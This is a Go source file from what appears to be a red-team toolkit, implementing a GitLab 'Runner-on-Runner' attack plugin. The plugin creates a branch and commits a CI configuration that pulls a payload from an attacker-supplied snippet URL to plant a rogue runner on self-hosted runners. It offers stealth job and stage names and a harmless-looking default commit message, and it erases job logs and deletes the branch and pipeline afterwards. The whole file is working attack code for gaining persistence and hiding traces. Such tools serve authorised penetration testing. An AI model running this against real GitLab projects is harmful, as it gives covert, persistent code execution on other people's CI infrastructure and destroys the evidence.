// pkg/gitlab/attacks/ror/ror.go
package ror

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/gitlab"
	"github.com/praetorian-inc/trajan/pkg/gitlab/attacks/common"
)

func init() {
	registry.RegisterAttackPlugin("gitlab", "ror", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements Runner-on-Runner attack for GitLab
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new ror attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"ror",
			"Deploy a rogue runner via snippet payload on self-hosted GitLab runners (Runner-on-Runner)",
			"gitlab",
			attacks.CategoryPersistence,
		),
	}
}

// CanAttack always returns false (force-only plugin)
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	return false
}

// Execute performs the Runner-on-Runner attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
		Repo:      opts.Target.Value,
	}

	// Validate required flags
	snippetURL := opts.ExtraOpts["snippet-url"]
	if snippetURL == "" {
		result.Success = false
		result.Message = "--snippet-url flag is required"
		return result, fmt.Errorf("missing required flag: --snippet-url")
	}

	// Parse runner tags (optional for RoR - may want default runner)
	var runnerTags []string
	if tagsStr := opts.ExtraOpts["runner-tags"]; tagsStr != "" {
		runnerTags = strings.Split(tagsStr, ",")
		for i := range runnerTags {
			runnerTags[i] = strings.TrimSpace(runnerTags[i])
		}
	}

	// Stealth options
	stealth := opts.ExtraOpts["stealth"] == "true"
	jobName := opts.ExtraOpts["job-name"]
	stageName := opts.ExtraOpts["stage-name"]
	commitMessage := opts.ExtraOpts["commit-message"]
	if commitMessage == "" {
		commitMessage = "Update CI configuration"
	}

	// Persist option
	var persistMinutes int
	if persistStr := opts.ExtraOpts["persist"]; persistStr != "" {
		var err error
		persistMinutes, err = strconv.Atoi(persistStr)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("invalid --persist value: %s", persistStr)
			return result, fmt.Errorf("invalid persist value: %w", err)
		}
	}

	// Get GitLab client
	glPlatform, ok := opts.Platform.(*gitlab.Platform)
	if !ok {
		result.Success = false
		result.Message = "platform is not GitLab"
		return result, fmt.Errorf("invalid platform type")
	}

	client := glPlatform.Client()

	// Setup log directory
	logDir := initLogDir(opts.Target.Value, opts.SessionID)
	fmt.Printf("[*] RoR logs will be written to: %s/\n", logDir)

	// Get project
	projectPath := opts.Target.Value
	project, err := client.GetProject(ctx, projectPath)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get project: %v", err)
		return result, err
	}

	projectID := project.ID

	if project.Archived {
		result.Success = false
		result.Message = fmt.Sprintf("project %s is archived", projectPath)
		return result, fmt.Errorf("project is archived")
	}

	fmt.Printf("[+] Project resolved: %s (id=%d)\n", projectPath, projectID)

	// Check user permissions
	user, err := client.GetUser(ctx)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get current user: %v", err)
		return result, err
	}

	member, err := client.GetProjectMember(ctx, projectID, strconv.Itoa(user.ID))
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to check permissions: %v", err)
		return result, err
	}

	if member.AccessLevel < 30 {
		result.Success = false
		result.Message = fmt.Sprintf("insufficient permissions: need Developer (30+), have %s (%d)",
			member.RoleName, member.AccessLevel)
		return result, fmt.Errorf("insufficient permissions")
	}

	fmt.Printf("[+] User has %s access (level: %d)\n", member.RoleName, member.AccessLevel)

	if !project.JobsEnabled {
		result.Success = false
		result.Message = "CI/CD pipelines are disabled for this project"
		return result, fmt.Errorf("pipelines disabled")
	}

	// Dry run check
	if opts.DryRun {
		yaml := GeneratePipelineYAML(snippetURL, runnerTags, stealth, jobName, stageName, persistMinutes)
		writeLog(logDir, "generated_ci.yml", yaml)
		fmt.Printf("\n[DRY RUN] Would commit the following .gitlab-ci.yml:\n%s\n", yaml)
		result.Success = true
		result.Message = "Dry run completed - no changes made"
		return result, nil
	}

	// Cleanup tracking
	var branchName string
	var pipelineID int
	var cleanupJobIDs []int

	cleanup := &common.DeferredCleanup{
		Client:     client,
		ProjectID:  projectID,
		BranchName: &branchName,
		PipelineID: &pipelineID,
		Disabled:   opts.ExtraOpts["cleanup"] == "false",
	}
	defer cleanup.Run()

	// Determine branch name
	if opts.Branch != "" {
		branchName = opts.Branch
	} else if stealth {
		branchName = common.GenerateBranchName(opts.SessionID)
	} else {
		branchName = common.GenerateBranchName(opts.SessionID)
	}

	defaultBranch := project.DefaultBranch
	if defaultBranch == "" {
		defaultBranch = "main"
	}

	// Get default branch SHA
	branchInfo, err := client.GetBranch(ctx, projectID, defaultBranch)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get default branch: %v", err)
		return result, err
	}

	// Step 1: Create branch
	fmt.Printf("\n[*] Step 1: Creating branch %s...\n", branchName)
	err = client.CreateBranch(ctx, projectID, branchName, branchInfo.Commit.ID)
	if err != nil {
		if strings.Contains(err.Error(), "already exists") {
			result.Success = false
			result.Message = fmt.Sprintf("branch %s already exists", branchName)
			return result, fmt.Errorf("branch already exists")
		}
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch: %v", err)
		return result, err
	}

	fmt.Printf("[+] Branch created: %s\n", branchName)

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "RoR attack branch",
	})

	// Generate YAML
	yamlContent := GeneratePipelineYAML(snippetURL, runnerTags, stealth, jobName, stageName, persistMinutes)
	writeLog(logDir, "generated_ci.yml", yamlContent)
	fmt.Printf("[+] Generated YAML written to: %s\n", filepath.Join(logDir, "generated_ci.yml"))

	// Check if .gitlab-ci.yml exists on branch
	_, err = client.GetWorkflowFile(ctx, projectID, ".gitlab-ci.yml", branchName)
	action := "create"
	if err == nil {
		action = "update"
	}

	// Step 2: Commit
	fmt.Printf("\n[*] Step 2: Committing .gitlab-ci.yml (%s)...\n", action)

	commitActions := []gitlab.CommitAction{
		{
			Action:   action,
			FilePath: ".gitlab-ci.yml",
			Content:  yamlContent,
		},
	}

	commit, err := client.CreateCommit(ctx, projectID, branchName, commitActions, commitMessage)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to commit: %v", err)
		return result, err
	}

	commitTimestamp := commit.CreatedAt
	fmt.Printf("[+] Commit pushed successfully\n")

	// Step 3: Monitor pipeline
	timeout := 5 * time.Minute
	if opts.Timeout > 0 {
		timeout = opts.Timeout
	}
	if persistMinutes > 0 {
		timeout = time.Duration(persistMinutes)*time.Minute + 3*time.Minute
	}

	fmt.Printf("\n[*] Step 3: Monitoring pipeline (timeout=%v)...\n", timeout)

	pipeline, err := common.WaitForPipeline(ctx, client, projectID, branchName, commitTimestamp, timeout)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("pipeline wait failed: %v", err)

		// Try to grab diagnostic info
		pipelines, listErr := client.ListPipelines(ctx, projectID, branchName)
		if listErr == nil && len(pipelines) > 0 {
			pipelineID = pipelines[0].ID
			diagInfo := fmt.Sprintf("Pipeline id=%d status=%s\n", pipelines[0].ID, pipelines[0].Status)

			// Get job details
			jobs, jobErr := client.ListPipelineJobs(ctx, projectID, pipelines[0].ID)
			if jobErr == nil {
				for _, job := range jobs {
					diagInfo += fmt.Sprintf("Job id=%d name=%s status=%s\n", job.ID, job.Name, job.Status)
					trace, traceErr := client.GetJobTrace(ctx, projectID, job.ID)
					if traceErr == nil {
						tracePath := writeLog(logDir, fmt.Sprintf("job_%d_%s_trace.log", job.ID, job.Name), trace)
						fmt.Printf("[!] Job id=%d name=%s status=%s - trace written to: %s\n",
							job.ID, job.Name, job.Status, tracePath)
					}
				}
			}
			writeLog(logDir, "pipeline_incomplete.txt", diagInfo)
		}

		return result, err
	}

	pipelineID = pipeline.ID

	// Step 4: Retrieve job logs
	fmt.Printf("\n[*] Step 4: Retrieving job logs for pipeline id=%d...\n", pipelineID)

	jobs, err := client.ListPipelineJobs(ctx, projectID, pipelineID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get pipeline jobs: %v", err)
		return result, err
	}

	for _, job := range jobs {
		cleanupJobIDs = append(cleanupJobIDs, job.ID)

		trace, traceErr := client.GetJobTrace(ctx, projectID, job.ID)
		if traceErr != nil {
			fmt.Printf("[!] Could not retrieve trace for job %d: %v\n", job.ID, traceErr)
			continue
		}

		tracePath := writeLog(logDir, fmt.Sprintf("job_%d_%s_trace.log", job.ID, job.Name), trace)

		runnerDesc := "unknown"
		if desc, ok := job.Runner["description"].(string); ok && desc != "" {
			runnerDesc = desc
		}

		fmt.Printf("\n--- Job: %s (id=%d, status=%s, runner=%s) ---\n",
			job.Name, job.ID, job.Status, runnerDesc)
		fmt.Printf("    Trace written to: %s\n", tracePath)

		// Print last 30 lines preview
		lines := strings.Split(trace, "\n")
		if len(lines) > 30 {
			fmt.Printf("    (showing last 30 lines, full trace in log file)\n")
			for _, line := range lines[len(lines)-30:] {
				fmt.Printf("    %s\n", line)
			}
		} else {
			for _, line := range lines {
				fmt.Printf("    %s\n", line)
			}
		}
	}

	// Erase job logs before cleanup deletes pipeline
	for _, jobID := range cleanupJobIDs {
		if err := client.DeleteJobLogs(ctx, projectID, jobID); err != nil {
			fmt.Printf("[!] Failed to erase job %d logs: %v\n", jobID, err)
		} else {
			fmt.Printf("[+] Erased job %d logs\n", jobID)
		}
	}

	// Write summary
	summary := fmt.Sprintf("Pipeline ID: %d\nStatus: %s\nBranch: %s\nProject: %s (id=%d)\nSession: %s\n",
		pipelineID, pipeline.Status, branchName, projectPath, projectID, opts.SessionID)
	writeLog(logDir, "summary.txt", summary)

	// Success
	result.Success = true
	result.Message = fmt.Sprintf("RoR payload delivered via pipeline %d on runner", pipelineID)
	result.Data = map[string]interface{}{
		"pipeline_id":  pipelineID,
		"branch":       branchName,
		"snippet_url":  snippetURL,
		"runner_tags":  runnerTags,
		"log_dir":      logDir,
		"jobs":         cleanupJobIDs,
	}

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete RoR attack branch",
		},
		{
			Type:        attacks.ArtifactWorkflow,
			Identifier:  fmt.Sprintf("pipeline:%d", pipelineID),
			Action:      "delete",
			Description: "Delete pipeline",
		},
	}

	fmt.Printf("\n[+] RoR attack complete. Logs saved to: %s/\n", logDir)

	return result, nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	glPlatform, ok := session.Platform.(*gitlab.Platform)
	if !ok {
		return fmt.Errorf("invalid platform type")
	}
	return common.CleanupSessionArtifacts(ctx, glPlatform.Client(), session, p.Name())
}

// initLogDir creates a timestamped log directory for this attack run
func initLogDir(projectPath, sessionID string) string {
	safe := strings.ReplaceAll(projectPath, "/", "_")
	timestamp := time.Now().Format("20060102_150405")
	logDir := filepath.Join("ror_logs", fmt.Sprintf("%s_%s_%s", safe, timestamp, sessionID))
	os.MkdirAll(logDir, 0700)
	return logDir
}

// writeLog writes content to a file in the log directory and returns the path
func writeLog(logDir, filename, content string) string {
	path := filepath.Join(logDir, filename)
	os.WriteFile(path, []byte(content), 0600)
	return path
}
